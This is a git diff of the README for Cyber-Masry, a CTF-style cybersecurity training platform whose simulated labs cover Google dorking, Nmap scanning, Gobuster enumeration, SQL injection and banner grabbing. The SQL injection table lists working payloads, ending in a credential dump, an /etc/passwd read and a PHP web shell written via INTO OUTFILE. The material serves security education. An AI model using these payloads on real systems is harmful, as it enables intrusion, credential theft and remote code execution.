@@ -25,15 +25,27 @@ Cyber-Masry is a **browser-based cybersecurity lab platform** that puts students
 - 🔍 A **Google Dork sandbox** (Zoogle) — learn advanced search operators interactively  
 - 🕵️ A **fake LinkedIn profile** — practice Social Media OSINT the ethical way
 - 📖 A **glossary tooltip system** — click any technical term for an instant definition + Egyptian Arabic analogy
-- 🤖 A **floating smart assistant** — step-aware guidance at every stage of the mission
+- 🤖 A **floating smart assistant** — lab-aware, step-aware guidance at every stage
 - 🚩 **CTF-style flag capture** — complete all steps to reveal the flag
 
 ---
 
-## 🎮 Lab 01 — El-Taqassi (التقصي)
-**Passive Reconnaissance & Google Dorking**
+## 🗺️ Available Labs
 
-Students take on the role of a penetration tester performing OSINT on a fictional company: **EvilCorp**.
+| # | Lab (EN / AR) | Focus | Difficulty | Points |
+|---|---------------|-------|------------|--------|
+| 01 | El-Taqassi / التقصي | Passive Recon & Google Dorking | Beginner | 100 |
+| 02 | El-Tafteesh / التفتيش | Port Scanning with Nmap | Intermediate | 150 |
+| 03 | El-Daraaj El-Serry / الدراج السري | Directory Enumeration (Gobuster) | Intermediate | 175 |
+| 04 | El-Ekhteraq / الاختراق | SQL Injection | Intermediate | 200 |
+| 05 | El-Basaama / البصمة | Banner Grabbing & CVE Analysis | Advanced | 250 |
+
+---
+
+## 🎮 Lab Details
+
+### Lab 01 — El-Taqassi (التقصي)
+**Passive Reconnaissance & Google Dorking**
 
 | Step | Tool | Objective |
 |------|------|-----------|
@@ -41,11 +53,73 @@ Students take on the role of a penetration tester performing OSINT on a fictiona
 | 2 | 💻 Terminal | `whois evilcorp.com` — Domain ownership |
 | 3 | 💻 Terminal | `nslookup evilcorp.com` — DNS resolution |
 | 4 | 💻 Terminal | `curl -I evilcorp.com` — HTTP header fingerprinting |
-| 5 | 🔎 LinkedIn | **El-Stalker** — Find the IT Manager's pet name from social media posts |
-| 6 | 🔍 Zoogle | Broad search trap — why generic queries fail |
-| 7 | 🔍 Zoogle | `site:evilcorp.com` — Site operator narrowing |
-| 8 | 🔍 Zoogle | `site:evilcorp.com inurl:admin` — Combined Google Dork |
-| 9 | 🔍 Zoogle | Click the target link → capture the `FLAG{...}` |
+| 5 | 🔎 LinkedIn | **El-Stalker** — Find IT Manager's pet name from social posts |
+| 6–8 | 🔍 Zoogle | Google Dork operators: `site:` + `inurl:admin` |
+| 9 | 🔍 Zoogle | Click target link → capture `FLAG{...}` |
+
+### Lab 02 — El-Tafteesh (التفتيش)
+**Active Port Scanning with Nmap**
+
+| Step | Command | Concept |
+|------|---------|---------|
+| 1 | `nmap 192.168.1.5` | Basic TCP SYN scan |
+| 2 | `nmap -sV 192.168.1.5` | Service version detection |
+| 3 | `nmap -p 22,80,443 192.168.1.5` | Targeted port scan |
+| 4 | `nmap -O 192.168.1.5` | OS fingerprinting |
+| 5 | `nmap -A 192.168.1.5` | Aggressive scan (version + OS + scripts) |
+| 6 | `nmap -p- 192.168.1.5` | Full 65535-port scan |
+| 7 | `nmap -sU 192.168.1.5` | UDP scan |
+| 8 | `nmap -T4 -F 192.168.1.5` | Fast scan with timing template |
+| 9 | `nmap --script vuln 192.168.1.5` | NSE vulnerability scripts |
+| 10 | `nmap -sn 192.168.1.0/24` | Host discovery / ping sweep |
+
+### Lab 03 — El-Daraaj El-Serry (الدراج السري)
+**Directory & File Enumeration with Gobuster**
+
+| Step | Command | Concept |
+|------|---------|---------|
+| 1 | `gobuster dir -u http://... -w common.txt` | Basic dir brute-force |
+| 2 | `gobuster dir ... -x php,html` | Extension filtering |
+| 3 | `gobuster dir ... -w admin.txt` | Admin-specific wordlist |
+| 4 | `gobuster dir ... -v` | Verbose — see 403 responses |
+| 5 | `gobuster dir ... -t 50` | Threading for speed |
+| 6 | `gobuster dns -d evilcorp.com -w subdomains.txt` | Subdomain enumeration |
+| 7 | `gobuster dir ... /api/v1/ ...` | API endpoint discovery |
+| 8 | `gobuster dir ... -x bak,sql,zip` | Backup file hunting |
+| 9 | `gobuster dir ... --delay 200ms` | Stealth slow scan |
+| 10 | `gobuster dir ... -o results.txt` | Save report to file |
+
+### Lab 04 — El-Ekhteraq (الاختراق)
+**SQL Injection — From Error to RCE**
+
+| Step | Payload | Technique |
+|------|---------|-----------|
+| 1 | `'` | Single quote error-based detection |
+| 2 | `' OR '1'='1` | Classic auth bypass |
+| 3 | `admin'--` | Comment-based bypass |
+| 4 | `' ORDER BY 3--` | Column count enumeration |
+| 5 | `' UNION SELECT 1,version(),3--` | UNION data extraction |
+| 6 | `' UNION SELECT 1,table_name,3 FROM information_schema.tables--` | Table enumeration |
+| 7 | `' UNION SELECT 1,concat(username,':',password),3 FROM users--` | Credential dump |
+| 8 | `' UNION SELECT 1,length(password),3 FROM users LIMIT 1--` | Hash length → algorithm |
+| 9 | `' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3--` | File read |
+| 10 | `' UNION SELECT 1,'<?php system($_GET[cmd]); ?>',3 INTO OUTFILE '/var/www/html/shell.php'--` | Web shell → RCE |
+
+### Lab 05 — El-Basaama (البصمة)
+**Banner Grabbing & CVE Analysis**
+
+| Step | Command | Service/CVE |
+|------|---------|-------------|
+| 1 | `nc 192.168.1.5 80` | HTTP — Apache/2.4.38, PHP/7.4.3 |
+| 2 | `nc 192.168.1.5 22` | SSH — OpenSSH 7.9 (CVE-2018-15473, CVE-2023-38408) |
+| 3 | `nc 192.168.1.5 21` | FTP — vsFTPd 3.0.3, anonymous login |
+| 4 | `curl -I http://192.168.1.5` | HTTP headers leak analysis |
+| 5 | `telnet 192.168.1.5 23` | Telnet plaintext = critical finding |
+| 6 | `searchsploit apache 2.4.38` | CVE-2019-0211 (CVSS 7.8) — local privesc |
+| 7 | `searchsploit openssh 7.9` | CVE-2018-15473 — username enumeration |
+| 8 | `nc 192.168.1.5 25` | SMTP — VRFY user enumeration |
+| 9 | `whatweb http://192.168.1.5` | One-shot web fingerprint (WP, jQuery) |
+| 10 | `nikto -h http://192.168.1.5` | Full automated web vulnerability scan |
 
 ---
 
@@ -56,23 +130,27 @@ Cyber-Masry/
 ├── frontend/                    # React + TypeScript (Vite)
 │   └── src/
 │       ├── components/
-│       │   ├── TerminalSimulator.tsx   # Linux terminal with 12+ commands
+│       │   ├── TerminalSimulator.tsx   # Lab 01 terminal (OSINT commands)
+│       │   ├── FloatingAssistant.tsx   # Lab-aware step guidance bot
 │       │   ├── ZoogleSearch.tsx        # Google Dork simulator
 │       │   ├── FakeLinkedIn.tsx        # OSINT social media challenge
-│       │   ├── FloatingAssistant.tsx   # Step-aware guidance bot
+│       │   ├── LabCompletionCelebration.tsx  # Confetti + flag modal
 │       │   ├── TermTooltip.tsx         # Glossary popup component
-│       │   ├── SuccessModal.tsx        # Flag capture celebration
-│       │   ├── MatrixBackground.tsx    # Animated canvas effect
 │       │   └── Header / Footer
 │       ├── hooks/
-│       │   └── useMissionProgress.ts   # 9-step mission state machine
-│       ├── data/
-│       │   └── glossary.ts             # 22 technical terms with Arabic analogies
-│       ├── utils/
-│       │   └── parseWithGlossary.tsx   # Inline term highlighter
+│       │   └── useMissionProgress.ts   # Global MissionStep interface
+│       ├── labs/
+│       │   ├── registry.ts             # Auto-discovers labs via meta.ts
+│       │   ├── types.ts                # LabMeta interface
+│       │   ├── lab01/ → Lab01.tsx (pages)
+│       │   ├── lab02/ → NmapTerminal · useMissionProgress · Page · meta
+│       │   ├── lab03/ → BusterTerminal · useMissionProgress · Page · meta
+│       │   ├── lab04/ → SQLiTerminal · useMissionProgress · Page · meta
+│       │   └── lab05/ → BannerTerminal · useMissionProgress · Page · meta
 │       └── pages/
 │           ├── LandingPage.tsx
-│           └── Lab01.tsx               # 3-tab lab layout
+│           ├── LabsPage.tsx
+│           └── LabRoute.tsx            # Dynamic lazy-loader by slug
 │
 └── backend/                     # Python Flask REST API
     ├── app.py                   # Routes: /api/labs, /api/solve
@@ -133,21 +211,6 @@ python app.py
 
 > The frontend Vite dev server proxies `/api/*` requests to Flask automatically.
 
----
-
-## 🛠️ Terminal Commands Available
-
-Students can run these in the lab terminal (all simulated, no real network calls):
-
-| Command | Description |
-|---------|-------------|
-| `whoami` | Current user + privilege level |
-| `whois evilcorp.com` | Domain ownership & registrar data |
-| `nslookup evilcorp.com` | DNS A/MX/NS records |
-| `dig evilcorp.com` | Detailed DNS query breakdown |
-| `curl -I evilcorp.com` | HTTP response headers |
-| `traceroute evilcorp.com` | Network hop tracing |
-| `netstat -an` | Active connections |
 | `ip addr` / `ifconfig` | Network interface info |
 | `ls` / `cat flag.txt` | Filesystem exploration |
 | `help` | Show all available commands |
